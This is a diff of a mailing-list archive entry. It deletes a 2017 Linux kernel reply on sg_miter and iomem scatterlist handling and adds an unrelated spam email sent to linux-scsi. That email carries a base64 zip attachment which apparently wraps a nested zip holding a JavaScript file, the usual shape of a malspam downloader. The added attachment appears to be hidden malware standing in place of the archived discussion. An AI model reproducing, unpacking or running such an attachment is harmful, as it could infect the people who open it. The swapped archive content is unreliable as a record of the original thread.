@@ -1,65 +1,68 @@
-From: Logan Gunthorpe <logang@deltatee.com>
-Subject: Re: [PATCH v2 15/21] xen-blkfront: Make use of the new sg_map helper
- function
-Date: Thu, 27 Apr 2017 17:29:08 -0600
-Message-ID: <eb33e0ce-987f-a345-ca95-71e4c0a4d1ea@deltatee.com>
-References: <1493144468-22493-1-git-send-email-logang@deltatee.com>
- <1493144468-22493-16-git-send-email-logang@deltatee.com>
- <20170426073720.okv33ly2ldepilti@dhcp-3-128.uk.xensource.com>
- <df6586e2-7d45-6b0b-facb-4dea882df06e@deltatee.com>
- <20170427205339.GB26330@obsidianresearch.com>
- <02ba3c7b-5fab-a06c-fbbf-c3be1c0fae1b@deltatee.com>
- <20170427221132.GA30036@obsidianresearch.com>
- <3a7c0d27-0744-4e91-b37f-3885c50455e8@deltatee.com>
- <20170427232022.GA30398@obsidianresearch.com>
+From: <a.skucha@satis-poland.com>
+Subject: 28940 linux-scsi
+Date: Fri, 28 Apr 2017 05:12:12 -0000
+Message-ID: <149335633222.22262.13670511056616798383@jupiter.com.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Return-path: <driverdev-devel-bounces@linuxdriverproject.org>
-In-Reply-To: <20170427232022.GA30398@obsidianresearch.com>
-List-Unsubscribe: <http://driverdev.linuxdriverproject.org/mailman/options/driverdev-devel>,
- <mailto:driverdev-devel-request@linuxdriverproject.org?subject=unsubscribe>
-List-Archive: <http://driverdev.linuxdriverproject.org/pipermail/driverdev-devel/>
-List-Post: <mailto:driverdev-devel@linuxdriverproject.org>
-List-Help: <mailto:driverdev-devel-request@linuxdriverproject.org?subject=help>
-List-Subscribe: <http://driverdev.linuxdriverproject.org/mailman/listinfo/driverdev-devel>,
- <mailto:driverdev-devel-request@linuxdriverproject.org?subject=subscribe>
-Errors-To: driverdev-devel-bounces@linuxdriverproject.org
-Sender: "devel" <driverdev-devel-bounces@linuxdriverproject.org>
-To: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>
-Cc: Boris Ostrovsky <boris.ostrovsky@oracle.com>, linux-nvdimm@ml01.01.org, dri-devel@lists.freedesktop.org, Stephen Bates <sbates@raithlin.com>, dm-devel@redhat.com, target-devel@vger.kernel.org, Christoph Hellwig <hch@lst.de>, devel@driverdev.osuosl.org, "James E.J. Bottomley" <jejb@linux.vnet.ibm.com>, linux-scsi@vger.kernel.org, Matthew Wilcox <mawilcox@microsoft.com>, linux-rdma@vger.kernel.org, Sumit Semwal <sumit.semwal@linaro.org>, Ross Zwisler <ross.zwisler@linux.intel.com>, open-iscsi@googlegroups.com, linux-media@vger.kernel.org, Juergen Gross <jgross@suse.com>, Julien Grall <julien.grall@arm.com>, Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>, intel-gfx@lists.freedesktop.org, sparmaintainer@unisys.com, linux-raid@vger.kernel.org, Dan Williams <dan.j.williams@intel.com>, megaraidlinux.pdl@broadcom.com, Jens Axboe <axboe@kernel.dk>, "Martin K. Petersen" <martin.p>
+Content-Type: application/zip; name="547.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from 186.193.184.147.jupiter.com.br ([186.193.184.147]:1479 "HELO
+        jupiter.com.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1163097AbdD1FMT (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>); Fri, 28 Apr 2017 01:12:19 -0400
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-
-
-On 27/04/17 05:20 PM, Jason Gunthorpe wrote:
-> It seems the most robust: test for iomem, and jump to a slow path
-> copy, otherwise inline the kmap and memcpy
-> 
-> Every place doing memcpy from sgl will need that pattern to be
-> correct.
-
-Ok, sounds like a good place to start to me. I'll see what I can do for
-a v3 of this set. Though, I probably won't send anything until after the
-merge window.
-
->>> sg_miter will still fail when the sg contains __iomem, however I would
->>> expect that the sg_copy will work with iomem, by using the __iomem
->>> memcpy variant.
->>
->> Yes, that's true. Any sg_miters that ever see iomem will need to be
->> converted to support it. This isn't much different than the other
->> kmap(sg_page()) users I was converting that will also fail if they see
->> iomem. Though, I suspect an sg_miter user would be easier to convert to
->> iomem than a random kmap user.
-> 
-> How? sg_miter seems like the next nightmare down this path, what is
-> sg_miter_next supposed to do when something hits an iomem sgl?
-
-My proposal is roughly included in the draft I sent upthread. We add an
-sg_miter flag indicating the iteratee supports iomem and if miter finds
-iomem (with the support flag set) it sets ioaddr which is __iomem. The
-iteratee then just needs to null check addr and ioaddr and perform the
-appropriate action.
-
-Logan
+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
